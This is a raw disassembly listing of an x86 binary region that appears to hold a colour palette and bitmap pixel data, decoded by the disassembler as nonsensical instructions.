  4016fb:	00 40 00             	add    %al,0x0(%eax)
  4016fe:	60                   	pusha
  4016ff:	00 40 00             	add    %al,0x0(%eax)
  401702:	80 00 40             	addb   $0x40,(%eax)
  401705:	00 a0 00 40 00 c0    	add    %ah,-0x3fffc000(%eax)
  40170b:	00 40 00             	add    %al,0x0(%eax)
  40170e:	e0 00                	loopne 0x401710
  401710:	40                   	inc    %eax
  401711:	20 00                	and    %al,(%eax)
  401713:	00 40 20             	add    %al,0x20(%eax)
  401716:	20 00                	and    %al,(%eax)
  401718:	40                   	inc    %eax
  401719:	20 40 00             	and    %al,0x0(%eax)
  40171c:	40                   	inc    %eax
  40171d:	20 60 00             	and    %ah,0x0(%eax)
  401720:	40                   	inc    %eax
  401721:	20 80 00 40 20 a0    	and    %al,-0x5fdfc000(%eax)
  401727:	00 40 20             	add    %al,0x20(%eax)
  40172a:	c0 00 40             	rolb   $0x40,(%eax)
  40172d:	20 e0                	and    %ah,%al
  40172f:	00 40 40             	add    %al,0x40(%eax)
  401732:	00 00                	add    %al,(%eax)
  401734:	40                   	inc    %eax
  401735:	40                   	inc    %eax
  401736:	20 00                	and    %al,(%eax)
  401738:	40                   	inc    %eax
  401739:	40                   	inc    %eax
  40173a:	40                   	inc    %eax
  40173b:	00 40 40             	add    %al,0x40(%eax)
  40173e:	60                   	pusha
  40173f:	00 40 40             	add    %al,0x40(%eax)
  401742:	80 00 40             	addb   $0x40,(%eax)
  401745:	40                   	inc    %eax
  401746:	a0 00 40 40 c0       	mov    0xc0404000,%al
  40174b:	00 40 40             	add    %al,0x40(%eax)
  40174e:	e0 00                	loopne 0x401750
  401750:	40                   	inc    %eax
  401751:	60                   	pusha
  401752:	00 00                	add    %al,(%eax)
  401754:	40                   	inc    %eax
  401755:	60                   	pusha
  401756:	20 00                	and    %al,(%eax)
  401758:	40                   	inc    %eax
  401759:	60                   	pusha
  40175a:	40                   	inc    %eax
  40175b:	00 40 60             	add    %al,0x60(%eax)
  40175e:	60                   	pusha
  40175f:	00 40 60             	add    %al,0x60(%eax)
  401762:	80 00 40             	addb   $0x40,(%eax)
  401765:	60                   	pusha
  401766:	a0 00 40 60 c0       	mov    0xc0604000,%al
  40176b:	00 40 60             	add    %al,0x60(%eax)
  40176e:	e0 00                	loopne 0x401770
  401770:	40                   	inc    %eax
  401771:	80 00 00             	addb   $0x0,(%eax)
  401774:	40                   	inc    %eax
  401775:	80 20 00             	andb   $0x0,(%eax)
  401778:	40                   	inc    %eax
  401779:	80 40 00 40          	addb   $0x40,0x0(%eax)
  40177d:	80 60 00 40          	andb   $0x40,0x0(%eax)
  401781:	80 80 00 40 80 a0 00 	addb   $0x0,-0x5f7fc000(%eax)
  401788:	40                   	inc    %eax
  401789:	80 c0 00             	add    $0x0,%al
  40178c:	40                   	inc    %eax
  40178d:	80 e0 00             	and    $0x0,%al
  401790:	40                   	inc    %eax
  401791:	a0 00 00 40 a0       	mov    0xa0400000,%al
  401796:	20 00                	and    %al,(%eax)
  401798:	40                   	inc    %eax
  401799:	a0 40 00 40 a0       	mov    0xa0400040,%al
  40179e:	60                   	pusha
  40179f:	00 40 a0             	add    %al,-0x60(%eax)
  4017a2:	80 00 40             	addb   $0x40,(%eax)
  4017a5:	a0 a0 00 40 a0       	mov    0xa04000a0,%al
  4017aa:	c0 00 40             	rolb   $0x40,(%eax)
  4017ad:	a0 e0 00 40 c0       	mov    0xc04000e0,%al
  4017b2:	00 00                	add    %al,(%eax)
  4017b4:	40                   	inc    %eax
  4017b5:	c0 20 00             	shlb   $0x0,(%eax)
  4017b8:	40                   	inc    %eax
  4017b9:	c0 40 00 40          	rolb   $0x40,0x0(%eax)
  4017bd:	c0 60 00 40          	shlb   $0x40,0x0(%eax)
  4017c1:	c0 80 00 40 c0 a0 00 	rolb   $0x0,-0x5f3fc000(%eax)
  4017c8:	40                   	inc    %eax
  4017c9:	c0 c0 00             	rol    $0x0,%al
  4017cc:	40                   	inc    %eax
  4017cd:	c0 e0 00             	shl    $0x0,%al
  4017d0:	40                   	inc    %eax
  4017d1:	e0 00                	loopne 0x4017d3
  4017d3:	00 40 e0             	add    %al,-0x20(%eax)
  4017d6:	20 00                	and    %al,(%eax)
  4017d8:	40                   	inc    %eax
  4017d9:	e0 40                	loopne 0x40181b
  4017db:	00 40 e0             	add    %al,-0x20(%eax)
  4017de:	60                   	pusha
  4017df:	00 40 e0             	add    %al,-0x20(%eax)
  4017e2:	80 00 40             	addb   $0x40,(%eax)
  4017e5:	e0 a0                	loopne 0x401787
  4017e7:	00 40 e0             	add    %al,-0x20(%eax)
  4017ea:	c0 00 40             	rolb   $0x40,(%eax)
  4017ed:	e0 e0                	loopne 0x4017cf
  4017ef:	00 80 00 00 00 80    	add    %al,-0x80000000(%eax)
  4017f5:	00 20                	add    %ah,(%eax)
  4017f7:	00 80 00 40 00 80    	add    %al,-0x7fffc000(%eax)
  4017fd:	00 60 00             	add    %ah,0x0(%eax)
  401800:	80 00 80             	addb   $0x80,(%eax)
  401803:	00 80 00 a0 00 80    	add    %al,-0x7fff6000(%eax)
  401809:	00 c0                	add    %al,%al
  40180b:	00 80 00 e0 00 80    	add    %al,-0x7fff2000(%eax)
  401811:	20 00                	and    %al,(%eax)
  401813:	00 80 20 20 00 80    	add    %al,-0x7fffdfe0(%eax)
  401819:	20 40 00             	and    %al,0x0(%eax)
  40181c:	80 20 60             	andb   $0x60,(%eax)
  40181f:	00 80 20 80 00 80    	add    %al,-0x7fff7fe0(%eax)
  401825:	20 a0 00 80 20 c0    	and    %ah,-0x3fdf8000(%eax)
  40182b:	00 80 20 e0 00 80    	add    %al,-0x7fff1fe0(%eax)
  401831:	40                   	inc    %eax
  401832:	00 00                	add    %al,(%eax)
  401834:	80 40 20 00          	addb   $0x0,0x20(%eax)
  401838:	80 40 40 00          	addb   $0x0,0x40(%eax)
  40183c:	80 40 60 00          	addb   $0x0,0x60(%eax)
  401840:	80 40 80 00          	addb   $0x0,-0x80(%eax)
  401844:	80 40 a0 00          	addb   $0x0,-0x60(%eax)
  401848:	80 40 c0 00          	addb   $0x0,-0x40(%eax)
  40184c:	80 40 e0 00          	addb   $0x0,-0x20(%eax)
  401850:	80 60 00 00          	andb   $0x0,0x0(%eax)
  401854:	80 60 20 00          	andb   $0x0,0x20(%eax)
  401858:	80 60 40 00          	andb   $0x0,0x40(%eax)
  40185c:	80 60 60 00          	andb   $0x0,0x60(%eax)
  401860:	80 60 80 00          	andb   $0x0,-0x80(%eax)
  401864:	80 60 a0 00          	andb   $0x0,-0x60(%eax)
  401868:	80 60 c0 00          	andb   $0x0,-0x40(%eax)
  40186c:	80 60 e0 00          	andb   $0x0,-0x20(%eax)
  401870:	80 80 00 00 80 80 20 	addb   $0x20,-0x7f800000(%eax)
  401877:	00 80 80 40 00 80    	add    %al,-0x7fffbf80(%eax)
  40187d:	80 60 00 80          	andb   $0x80,0x0(%eax)
  401881:	80 80 00 80 80 a0 00 	addb   $0x0,-0x5f7f8000(%eax)
  401888:	80 80 c0 00 80 80 e0 	addb   $0xe0,-0x7f7fff40(%eax)
  40188f:	00 80 a0 00 00 80    	add    %al,-0x7fffff60(%eax)
  401895:	a0 20 00 80 a0       	mov    0xa0800020,%al
  40189a:	40                   	inc    %eax
  40189b:	00 80 a0 60 00 80    	add    %al,-0x7fff9f60(%eax)
  4018a1:	a0 80 00 80 a0       	mov    0xa0800080,%al
  4018a6:	a0 00 80 a0 c0       	mov    0xc0a08000,%al
  4018ab:	00 80 a0 e0 00 80    	add    %al,-0x7fff1f60(%eax)
  4018b1:	c0 00 00             	rolb   $0x0,(%eax)
  4018b4:	80 c0 20             	add    $0x20,%al
  4018b7:	00 80 c0 40 00 80    	add    %al,-0x7fffbf40(%eax)
  4018bd:	c0 60 00 80          	shlb   $0x80,0x0(%eax)
  4018c1:	c0 80 00 80 c0 a0 00 	rolb   $0x0,-0x5f3f8000(%eax)
  4018c8:	80 c0 c0             	add    $0xc0,%al
  4018cb:	00 80 c0 e0 00 80    	add    %al,-0x7fff1f40(%eax)
  4018d1:	e0 00                	loopne 0x4018d3
  4018d3:	00 80 e0 20 00 80    	add    %al,-0x7fffdf20(%eax)
  4018d9:	e0 40                	loopne 0x40191b
  4018db:	00 80 e0 60 00 80    	add    %al,-0x7fff9f20(%eax)
  4018e1:	e0 80                	loopne 0x401863
  4018e3:	00 80 e0 a0 00 80    	add    %al,-0x7fff5f20(%eax)
  4018e9:	e0 c0                	loopne 0x4018ab
  4018eb:	00 80 e0 e0 00 c0    	add    %al,-0x3fff1f20(%eax)
  4018f1:	00 00                	add    %al,(%eax)
  4018f3:	00 c0                	add    %al,%al
  4018f5:	00 20                	add    %ah,(%eax)
  4018f7:	00 c0                	add    %al,%al
  4018f9:	00 40 00             	add    %al,0x0(%eax)
  4018fc:	c0 00 60             	rolb   $0x60,(%eax)
  4018ff:	00 c0                	add    %al,%al
  401901:	00 80 00 c0 00 a0    	add    %al,-0x5fff4000(%eax)
  401907:	00 c0                	add    %al,%al
  401909:	00 c0                	add    %al,%al
  40190b:	00 c0                	add    %al,%al
  40190d:	00 e0                	add    %ah,%al
  40190f:	00 c0                	add    %al,%al
  401911:	20 00                	and    %al,(%eax)
  401913:	00 c0                	add    %al,%al
  401915:	20 20                	and    %ah,(%eax)
  401917:	00 c0                	add    %al,%al
  401919:	20 40 00             	and    %al,0x0(%eax)
  40191c:	c0 20 60             	shlb   $0x60,(%eax)
  40191f:	00 c0                	add    %al,%al
  401921:	20 80 00 c0 20 a0    	and    %al,-0x5fdf4000(%eax)
  401927:	00 c0                	add    %al,%al
  401929:	20 c0                	and    %al,%al
  40192b:	00 c0                	add    %al,%al
  40192d:	20 e0                	and    %ah,%al
  40192f:	00 c0                	add    %al,%al
  401931:	40                   	inc    %eax
  401932:	00 00                	add    %al,(%eax)
  401934:	c0 40 20 00          	rolb   $0x0,0x20(%eax)
  401938:	c0 40 40 00          	rolb   $0x0,0x40(%eax)
  40193c:	c0 40 60 00          	rolb   $0x0,0x60(%eax)
  401940:	c0 40 80 00          	rolb   $0x0,-0x80(%eax)
  401944:	c0 40 a0 00          	rolb   $0x0,-0x60(%eax)
  401948:	c0 40 c0 00          	rolb   $0x0,-0x40(%eax)
  40194c:	c0 40 e0 00          	rolb   $0x0,-0x20(%eax)
  401950:	c0 60 00 00          	shlb   $0x0,0x0(%eax)
  401954:	c0 60 20 00          	shlb   $0x0,0x20(%eax)
  401958:	c0 60 40 00          	shlb   $0x0,0x40(%eax)
  40195c:	c0 60 60 00          	shlb   $0x0,0x60(%eax)
  401960:	c0 60 80 00          	shlb   $0x0,-0x80(%eax)
  401964:	c0 60 a0 00          	shlb   $0x0,-0x60(%eax)
  401968:	c0 60 c0 00          	shlb   $0x0,-0x40(%eax)
  40196c:	c0 60 e0 00          	shlb   $0x0,-0x20(%eax)
  401970:	c0 80 00 00 c0 80 20 	rolb   $0x20,-0x7f400000(%eax)
  401977:	00 c0                	add    %al,%al
  401979:	80 40 00 c0          	addb   $0xc0,0x0(%eax)
  40197d:	80 60 00 c0          	andb   $0xc0,0x0(%eax)
  401981:	80 80 00 c0 80 a0 00 	addb   $0x0,-0x5f7f4000(%eax)
  401988:	c0 80 c0 00 c0 80 e0 	rolb   $0xe0,-0x7f3fff40(%eax)
  40198f:	00 c0                	add    %al,%al
  401991:	a0 00 00 c0 a0       	mov    0xa0c00000,%al
  401996:	20 00                	and    %al,(%eax)
  401998:	c0 a0 40 00 c0 a0 60 	shlb   $0x60,-0x5f3fffc0(%eax)
  40199f:	00 c0                	add    %al,%al
  4019a1:	a0 80 00 c0 a0       	mov    0xa0c00080,%al
  4019a6:	a0 00 c0 a0 c0       	mov    0xc0a0c000,%al
  4019ab:	00 c0                	add    %al,%al
  4019ad:	a0 e0 00 c0 c0       	mov    0xc0c000e0,%al
  4019b2:	00 00                	add    %al,(%eax)
  4019b4:	c0 c0 20             	rol    $0x20,%al
  4019b7:	00 c0                	add    %al,%al
  4019b9:	c0 40 00 c0          	rolb   $0xc0,0x0(%eax)
  4019bd:	c0 60 00 c0          	shlb   $0xc0,0x0(%eax)
  4019c1:	c0 80 00 c0 c0 a0 00 	rolb   $0x0,-0x5f3f4000(%eax)
  4019c8:	f0 fb                	lock sti
  4019ca:	ff 00                	incl   (%eax)
  4019cc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4019cd:	a0 a0 00 80 80       	mov    0x808000a0,%al
  4019d2:	80 00 00             	addb   $0x0,(%eax)
  4019d5:	00 ff                	add    %bh,%bh
  4019d7:	00 00                	add    %al,(%eax)
  4019d9:	ff 00                	incl   (%eax)
  4019db:	00 00                	add    %al,(%eax)
  4019dd:	ff                   	(bad)
  4019de:	ff 00                	incl   (%eax)
  4019e0:	ff 00                	incl   (%eax)
  4019e2:	00 00                	add    %al,(%eax)
  4019e4:	ff 00                	incl   (%eax)
  4019e6:	ff 00                	incl   (%eax)
  4019e8:	ff                   	(bad)
  4019e9:	ff 00                	incl   (%eax)
  4019eb:	00 ff                	add    %bh,%bh
  4019ed:	ff                   	(bad)
  4019ee:	ff 00                	incl   (%eax)
	...
  401a34:	00 00                	add    %al,(%eax)
  401a36:	f6 09 09             	testb  $0x9,(%ecx)
  401a39:	f6 00 00             	testb  $0x0,(%eax)
	...
  401a60:	00 00                	add    %al,(%eax)
  401a62:	00 f6                	add    %dh,%dh
  401a64:	09 09                	or     %ecx,(%ecx)
  401a66:	eb eb                	jmp    0x401a53
  401a68:	eb eb                	jmp    0x401a55
  401a6a:	f3 09 f6             	repz or %esi,%esi
	...
  401a91:	ff 09                	decl   (%ecx)
  401a93:	eb eb                	jmp    0x401a80
  401a95:	eb eb                	jmp    0x401a82
  401a97:	eb eb                	jmp    0x401a84
  401a99:	eb eb                	jmp    0x401a86
  401a9b:	eb eb                	jmp    0x401a88
  401a9d:	09 f6                	or     %esi,%esi
	...
  401abf:	ff 09                	decl   (%ecx)
  401ac1:	f3 eb eb             	repz jmp 0x401aaf
  401ac4:	eb eb                	jmp    0x401ab1
  401ac6:	eb eb                	jmp    0x401ab3
  401ac8:	eb eb                	jmp    0x401ab5
  401aca:	eb eb                	jmp    0x401ab7
  401acc:	eb eb                	jmp    0x401ab9
  401ace:	eb 09                	jmp    0x401ad9
  401ad0:	ff 00                	incl   (%eax)
	...
  401aee:	09 f3                	or     %esi,%ebx
  401af0:	eb eb                	jmp    0x401add
  401af2:	eb eb                	jmp    0x401adf
  401af4:	eb eb                	jmp    0x401ae1
  401af6:	eb eb                	jmp    0x401ae3
  401af8:	eb eb                	jmp    0x401ae5
  401afa:	eb eb                	jmp    0x401ae7
  401afc:	eb eb                	jmp    0x401ae9
  401afe:	eb eb                	jmp    0x401aeb
  401b00:	f3 09 00             	repz or %eax,(%eax)
	...
  401b1b:	00 00                	add    %al,(%eax)
  401b1d:	09 eb                	or     %ebp,%ebx
  401b1f:	eb eb                	jmp    0x401b0c
  401b21:	eb eb                	jmp    0x401b0e
  401b23:	eb eb                	jmp    0x401b10
  401b25:	eb eb                	jmp    0x401b12
  401b27:	eb eb                	jmp    0x401b14
  401b29:	eb eb                	jmp    0x401b16
  401b2b:	eb eb                	jmp    0x401b18
  401b2d:	eb eb                	jmp    0x401b1a
  401b2f:	eb eb                	jmp    0x401b1c
  401b31:	eb 09                	jmp    0x401b3c
	...
  401b4b:	00 09                	add    %cl,(%ecx)
  401b4d:	eb eb                	jmp    0x401b3a
  401b4f:	eb eb                	jmp    0x401b3c
  401b51:	eb eb                	jmp    0x401b3e
  401b53:	eb eb                	jmp    0x401b40
  401b55:	eb eb                	jmp    0x401b42
  401b57:	eb eb                	jmp    0x401b44
  401b59:	eb eb                	jmp    0x401b46
  401b5b:	eb eb                	jmp    0x401b48
  401b5d:	eb eb                	jmp    0x401b4a
  401b5f:	eb eb                	jmp    0x401b4c
  401b61:	eb eb                	jmp    0x401b4e
  401b63:	09 ff                	or     %edi,%edi
	...
  401b79:	00 00                	add    %al,(%eax)
  401b7b:	09 eb                	or     %ebp,%ebx
  401b7d:	eb eb                	jmp    0x401b6a
  401b7f:	eb eb                	jmp    0x401b6c
  401b81:	eb eb                	jmp    0x401b6e
  401b83:	eb eb                	jmp    0x401b70
  401b85:	eb eb                	jmp    0x401b72
  401b87:	eb eb                	jmp    0x401b74
  401b89:	eb eb                	jmp    0x401b76
  401b8b:	eb eb                	jmp    0x401b78
  401b8d:	eb eb                	jmp    0x401b7a
  401b8f:	eb eb                	jmp    0x401b7c
  401b91:	eb eb                	jmp    0x401b7e
  401b93:	eb f3                	jmp    0x401b88
  401b95:	f6 00 00             	testb  $0x0,(%eax)
	...
  401ba8:	00 00                	add    %al,(%eax)
  401baa:	09 eb                	or     %ebp,%ebx
  401bac:	eb eb                	jmp    0x401b99
  401bae:	eb eb                	jmp    0x401b9b
  401bb0:	eb eb                	jmp    0x401b9d
  401bb2:	eb eb                	jmp    0x401b9f
  401bb4:	eb eb                	jmp    0x401ba1
  401bb6:	eb eb                	jmp    0x401ba3
  401bb8:	eb eb                	jmp    0x401ba5
  401bba:	eb eb                	jmp    0x401ba7
  401bbc:	eb eb                	jmp    0x401ba9
  401bbe:	eb eb                	jmp    0x401bab
  401bc0:	eb eb                	jmp    0x401bad
  401bc2:	eb eb                	jmp    0x401baf
  401bc4:	eb 09                	jmp    0x401bcf
	...
  401bd6:	00 00                	add    %al,(%eax)
  401bd8:	00 09                	add    %cl,(%ecx)
  401bda:	eb eb                	jmp    0x401bc7
  401bdc:	eb eb                	jmp    0x401bc9
  401bde:	eb eb                	jmp    0x401bcb
  401be0:	eb eb                	jmp    0x401bcd
  401be2:	eb eb                	jmp    0x401bcf
  401be4:	eb eb                	jmp    0x401bd1
  401be6:	eb eb                	jmp    0x401bd3
  401be8:	eb eb                	jmp    0x401bd5
  401bea:	eb eb                	jmp    0x401bd7
  401bec:	eb eb                	jmp    0x401bd9
  401bee:	eb eb                	jmp    0x401bdb
  401bf0:	eb eb                	jmp    0x401bdd
  401bf2:	eb eb                	jmp    0x401bdf
  401bf4:	eb eb                	jmp    0x401be1
  401bf6:	09 00                	or     %eax,(%eax)
	...
  401c08:	09 eb                	or     %ebp,%ebx
  401c0a:	eb eb                	jmp    0x401bf7
  401c0c:	eb eb                	jmp    0x401bf9
  401c0e:	eb eb                	jmp    0x401bfb
  401c10:	eb eb                	jmp    0x401bfd
  401c12:	eb eb                	jmp    0x401bff
  401c14:	eb eb                	jmp    0x401c01
  401c16:	eb eb                	jmp    0x401c03
  401c18:	eb eb                	jmp    0x401c05
  401c1a:	eb eb                	jmp    0x401c07
  401c1c:	eb eb                	jmp    0x401c09
  401c1e:	eb eb                	jmp    0x401c0b
  401c20:	eb eb                	jmp    0x401c0d
  401c22:	eb eb                	jmp    0x401c0f
  401c24:	eb eb                	jmp    0x401c11
  401c26:	eb 09                	jmp    0x401c31
	...
  401c34:	00 00                	add    %al,(%eax)
  401c36:	00 ff                	add    %bh,%bh
  401c38:	f3 eb eb             	repz jmp 0x401c26
  401c3b:	eb eb                	jmp    0x401c28
  401c3d:	eb eb                	jmp    0x401c2a
  401c3f:	eb eb                	jmp    0x401c2c
  401c41:	eb eb                	jmp    0x401c2e
  401c43:	eb eb                	jmp    0x401c30
  401c45:	eb eb                	jmp    0x401c32
  401c47:	eb eb                	jmp    0x401c34
  401c49:	eb eb                	jmp    0x401c36
  401c4b:	eb eb                	jmp    0x401c38
  401c4d:	eb eb                	jmp    0x401c3a
  401c4f:	eb eb                	jmp    0x401c3c
  401c51:	eb eb                	jmp    0x401c3e
  401c53:	eb eb                	jmp    0x401c40
  401c55:	eb eb                	jmp    0x401c42
  401c57:	eb 09                	jmp    0x401c62
	...
  401c65:	00 00                	add    %al,(%eax)
  401c67:	09 eb                	or     %ebp,%ebx
  401c69:	eb eb                	jmp    0x401c56
  401c6b:	eb eb                	jmp    0x401c58
  401c6d:	eb eb                	jmp    0x401c5a
  401c6f:	eb eb                	jmp    0x401c5c
  401c71:	eb eb                	jmp    0x401c5e
  401c73:	eb eb                	jmp    0x401c60
  401c75:	eb eb                	jmp    0x401c62
  401c77:	eb eb                	jmp    0x401c64
  401c79:	eb eb                	jmp    0x401c66
  401c7b:	eb eb                	jmp    0x401c68
  401c7d:	eb eb                	jmp    0x401c6a
  401c7f:	eb eb                	jmp    0x401c6c
  401c81:	eb eb                	jmp    0x401c6e
  401c83:	eb eb                	jmp    0x401c70
  401c85:	eb eb                	jmp    0x401c72
  401c87:	eb f3                	jmp    0x401c7c
	...
  401c95:	00 09                	add    %cl,(%ecx)
  401c97:	eb eb                	jmp    0x401c84
  401c99:	eb eb                	jmp    0x401c86
  401c9b:	eb eb                	jmp    0x401c88
  401c9d:	f3 09 09             	repz or %ecx,(%ecx)
  401ca0:	09 09                	or     %ecx,(%ecx)
  401ca2:	eb eb                	jmp    0x401c8f
  401ca4:	eb eb                	jmp    0x401c91
  401ca6:	eb eb                	jmp    0x401c93
  401ca8:	eb eb                	jmp    0x401c95
  401caa:	eb eb                	jmp    0x401c97
  401cac:	eb eb                	jmp    0x401c99
  401cae:	09 09                	or     %ecx,(%ecx)
  401cb0:	09 09                	or     %ecx,(%ecx)
  401cb2:	09 eb                	or     %ebp,%ebx
  401cb4:	eb eb                	jmp    0x401ca1
  401cb6:	eb eb                	jmp    0x401ca3
  401cb8:	eb 09                	jmp    0x401cc3
	...
  401cc6:	f3 eb eb             	repz jmp 0x401cb4
  401cc9:	eb eb                	jmp    0x401cb6
  401ccb:	eb eb                	jmp    0x401cb8
  401ccd:	eb 09                	jmp    0x401cd8
  401ccf:	ff                   	(bad)
  401cd0:	ff                   	(bad)
  401cd1:	ff 09                	decl   (%ecx)
  401cd3:	eb eb                	jmp    0x401cc0
  401cd5:	eb eb                	jmp    0x401cc2
  401cd7:	eb eb                	jmp    0x401cc4
  401cd9:	eb eb                	jmp    0x401cc6
  401cdb:	eb eb                	jmp    0x401cc8
  401cdd:	09 ff                	or     %edi,%edi
  401cdf:	ff                   	(bad)
  401ce0:	ff f6                	push   %esi
  401ce2:	f3 eb eb             	repz jmp 0x401cd0
  401ce5:	eb eb                	jmp    0x401cd2
  401ce7:	eb eb                	jmp    0x401cd4
  401ce9:	f3 ff 00             	repz incl (%eax)
	...
  401cf4:	00 09                	add    %cl,(%ecx)
  401cf6:	eb eb                	jmp    0x401ce3
  401cf8:	eb eb                	jmp    0x401ce5
  401cfa:	eb eb                	jmp    0x401ce7
  401cfc:	eb eb                	jmp    0x401ce9
  401cfe:	eb 09                	jmp    0x401d09
  401d00:	ff                   	(bad)
  401d01:	ff f6                	push   %esi
  401d03:	09 eb                	or     %ebp,%ebx
  401d05:	eb eb                	jmp    0x401cf2
  401d07:	eb eb                	jmp    0x401cf4
  401d09:	eb eb                	jmp    0x401cf6
  401d0b:	eb f3                	jmp    0x401d00
  401d0d:	f6 ff                	idiv   %bh
  401d0f:	ff                   	(bad)
  401d10:	ff 09                	decl   (%ecx)
  401d12:	eb eb                	jmp    0x401cff
  401d14:	eb eb                	jmp    0x401d01
  401d16:	eb eb                	jmp    0x401d03
  401d18:	eb eb                	jmp    0x401d05
  401d1a:	09 00                	or     %eax,(%eax)
	...
  401d24:	00 f3                	add    %dh,%bl
  401d26:	eb eb                	jmp    0x401d13
  401d28:	eb eb                	jmp    0x401d15
  401d2a:	eb eb                	jmp    0x401d17
  401d2c:	eb eb                	jmp    0x401d19
  401d2e:	eb eb                	jmp    0x401d1b
  401d30:	09 ff                	or     %edi,%edi
  401d32:	ff 09                	decl   (%ecx)
  401d34:	eb eb                	jmp    0x401d21
  401d36:	eb eb                	jmp    0x401d23
  401d38:	eb eb                	jmp    0x401d25
  401d3a:	eb eb                	jmp    0x401d27
  401d3c:	09 ff                	or     %edi,%edi
  401d3e:	ff                   	(bad)
  401d3f:	ff 09                	decl   (%ecx)
  401d41:	eb eb                	jmp    0x401d2e
  401d43:	eb eb                	jmp    0x401d30
  401d45:	eb eb                	jmp    0x401d32
  401d47:	eb eb                	jmp    0x401d34
  401d49:	eb f3                	jmp    0x401d3e
  401d4b:	ff 00                	incl   (%eax)
  401d4d:	00 00                	add    %al,(%eax)
  401d4f:	00 00                	add    %al,(%eax)
  401d51:	00 00                	add    %al,(%eax)
  401d53:	00 09                	add    %cl,(%ecx)
  401d55:	eb eb                	jmp    0x401d42
  401d57:	eb eb                	jmp    0x401d44
  401d59:	eb eb                	jmp    0x401d46
  401d5b:	eb eb                	jmp    0x401d48
  401d5d:	eb eb                	jmp    0x401d4a
  401d5f:	eb f3                	jmp    0x401d54
  401d61:	f6 ff                	idiv   %bh
  401d63:	ff 09                	decl   (%ecx)
  401d65:	eb eb                	jmp    0x401d52
  401d67:	eb eb                	jmp    0x401d54
  401d69:	eb eb                	jmp    0x401d56
  401d6b:	09 ff                	or     %edi,%edi
  401d6d:	ff                   	(bad)
  401d6e:	ff f6                	push   %esi
  401d70:	f3 eb eb             	repz jmp 0x401d5e
  401d73:	eb eb                	jmp    0x401d60
  401d75:	eb eb                	jmp    0x401d62
  401d77:	eb eb                	jmp    0x401d64
  401d79:	eb eb                	jmp    0x401d66
  401d7b:	09 00                	or     %eax,(%eax)
  401d7d:	00 00                	add    %al,(%eax)
  401d7f:	00 00                	add    %al,(%eax)
  401d81:	00 00                	add    %al,(%eax)
  401d83:	00 09                	add    %cl,(%ecx)
  401d85:	eb eb                	jmp    0x401d72
  401d87:	eb eb                	jmp    0x401d74
  401d89:	eb eb                	jmp    0x401d76
  401d8b:	eb eb                	jmp    0x401d78
  401d8d:	eb eb                	jmp    0x401d7a
  401d8f:	eb eb                	jmp    0x401d7c
  401d91:	09 ff                	or     %edi,%edi
  401d93:	ff                   	(bad)
  401d94:	ff 09                	decl   (%ecx)
  401d96:	eb eb                	jmp    0x401d83
  401d98:	eb eb                	jmp    0x401d85
  401d9a:	09 f6                	or     %esi,%esi
  401d9c:	ff                   	(bad)
  401d9d:	ff                   	(bad)
  401d9e:	ff 09                	decl   (%ecx)
  401da0:	eb eb                	jmp    0x401d8d
  401da2:	eb eb                	jmp    0x401d8f
  401da4:	eb eb                	jmp    0x401d91
  401da6:	eb eb                	jmp    0x401d93
  401da8:	eb eb                	jmp    0x401d95
  401daa:	eb 09                	jmp    0x401db5
	...
  401db4:	f3 eb eb             	repz jmp 0x401da2
  401db7:	eb eb                	jmp    0x401da4
  401db9:	eb eb                	jmp    0x401da6
  401dbb:	eb eb                	jmp    0x401da8
  401dbd:	eb eb                	jmp    0x401daa
  401dbf:	eb eb                	jmp    0x401dac
  401dc1:	eb 09                	jmp    0x401dcc
  401dc3:	ff                   	(bad)
  401dc4:	ff f6                	push   %esi
  401dc6:	09 eb                	or     %ebp,%ebx
  401dc8:	eb eb                	jmp    0x401db5
  401dca:	09 ff                	or     %edi,%edi
  401dcc:	ff                   	(bad)
  401dcd:	ff 09                	decl   (%ecx)
  401dcf:	eb eb                	jmp    0x401dbc
  401dd1:	eb eb                	jmp    0x401dbe
  401dd3:	eb eb                	jmp    0x401dc0
  401dd5:	eb eb                	jmp    0x401dc2
  401dd7:	eb eb                	jmp    0x401dc4
  401dd9:	eb eb                	jmp    0x401dc6
  401ddb:	eb f6                	jmp    0x401dd3
  401ddd:	00 00                	add    %al,(%eax)
  401ddf:	00 00                	add    %al,(%eax)
  401de1:	00 00                	add    %al,(%eax)
  401de3:	09 eb                	or     %ebp,%ebx
  401de5:	eb eb                	jmp    0x401dd2
  401de7:	eb eb                	jmp    0x401dd4
  401de9:	eb eb                	jmp    0x401dd6
  401deb:	eb eb                	jmp    0x401dd8
  401ded:	eb eb                	jmp    0x401dda
  401def:	eb eb                	jmp    0x401ddc
  401df1:	eb eb                	jmp    0x401dde
  401df3:	09 ff                	or     %edi,%edi
  401df5:	ff 09                	decl   (%ecx)
  401df7:	eb eb                	jmp    0x401de4
  401df9:	09 ff                	or     %edi,%edi
  401dfb:	ff                   	(bad)
  401dfc:	ff 09                	decl   (%ecx)
  401dfe:	eb eb                	jmp    0x401deb
  401e00:	eb eb                	jmp    0x401ded
  401e02:	eb eb                	jmp    0x401def
  401e04:	eb eb                	jmp    0x401df1
  401e06:	eb eb                	jmp    0x401df3
  401e08:	eb eb                	jmp    0x401df5
  401e0a:	eb eb                	jmp    0x401df7
  401e0c:	09 00                	or     %eax,(%eax)
  401e0e:	00 00                	add    %al,(%eax)
  401e10:	00 00                	add    %al,(%eax)
  401e12:	00 09                	add    %cl,(%ecx)
  401e14:	eb eb                	jmp    0x401e01
  401e16:	eb eb                	jmp    0x401e03
  401e18:	eb eb                	jmp    0x401e05
  401e1a:	eb eb                	jmp    0x401e07
  401e1c:	eb eb                	jmp    0x401e09
  401e1e:	eb eb                	jmp    0x401e0b
  401e20:	eb eb                	jmp    0x401e0d
  401e22:	eb f3                	jmp    0x401e17
  401e24:	f6 ff                	idiv   %bh
  401e26:	ff 09                	decl   (%ecx)
  401e28:	09 ff                	or     %edi,%edi
  401e2a:	ff                   	(bad)
  401e2b:	ff f6                	push   %esi
  401e2d:	09 eb                	or     %ebp,%ebx
  401e2f:	eb eb                	jmp    0x401e1c
  401e31:	eb eb                	jmp    0x401e1e
  401e33:	eb eb                	jmp    0x401e20
  401e35:	eb eb                	jmp    0x401e22
  401e37:	eb eb                	jmp    0x401e24
  401e39:	eb eb                	jmp    0x401e26
  401e3b:	eb 09                	jmp    0x401e46
  401e3d:	00 00                	add    %al,(%eax)
  401e3f:	00 00                	add    %al,(%eax)
  401e41:	00 00                	add    %al,(%eax)
  401e43:	09 eb                	or     %ebp,%ebx
  401e45:	eb eb                	jmp    0x401e32
  401e47:	eb eb                	jmp    0x401e34
  401e49:	eb eb                	jmp    0x401e36
